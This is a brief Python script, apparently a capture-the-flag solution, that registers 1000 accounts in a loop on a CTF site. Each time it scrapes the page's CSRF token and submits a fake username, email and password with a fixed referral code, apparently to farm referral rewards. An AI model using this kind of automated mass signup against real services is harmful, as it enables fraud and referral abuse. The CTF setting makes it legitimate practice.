import requests, random
from bs4 import BeautifulSoup

reg_url = 'https://chatius-paris.ctf.upml.tech/register'

for i in range(1000):
    with requests.Session() as s:
        headers = {'content-type':'application/json'}

        r = s.get(reg_url)
        soup = BeautifulSoup(r.text, 'html.parser')
        csrf = soup.find(id="csrf_token").attrs['value']
        s.headers.update({'csrf_token':csrf})
        username = 'petya'+ str(random.randint(1,100000))
        r = s.post(reg_url, data={'csrf_token':csrf, 'email': username+'@abc.efg', 'password': username, 'username':username, 'referal': 'petya2281337'})
